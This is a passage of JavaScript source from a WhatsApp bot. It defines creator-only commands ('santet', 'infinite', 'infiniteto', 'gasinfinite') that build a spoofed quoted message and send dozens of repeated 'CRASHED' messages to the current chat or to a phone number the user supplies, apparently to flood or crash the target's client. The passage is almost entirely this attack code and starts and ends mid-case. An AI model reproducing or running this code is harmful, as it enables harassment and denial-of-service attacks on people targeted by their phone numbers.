            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await sleep(30000)
            }
            break
         case 'santet':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            freply(`BERHASIL MENGIRIM SANTET`)
            break
                    case 'infinite':               
          if (!isCreator) return
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            break
            case 'infiniteto':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            freply(`SUCCES`)
            break
                   case 'gasinfinite':               
          if (!isCreator) return
          if (!text) throw `Nomernya mana?`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE`,
                            "jpegThumbnail": thumb
                        } 
                    } 
                }
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(m.chat, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
            await hisoka.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐕𝐀𝐍𝐍𝐄𝐒𝐒 𝐓𝐙𝐘 𝐂𝐑𝐀𝐒𝐇𝐄𝐃ˣ_ˣ INFINITE"},{quoted:asukonyol11})
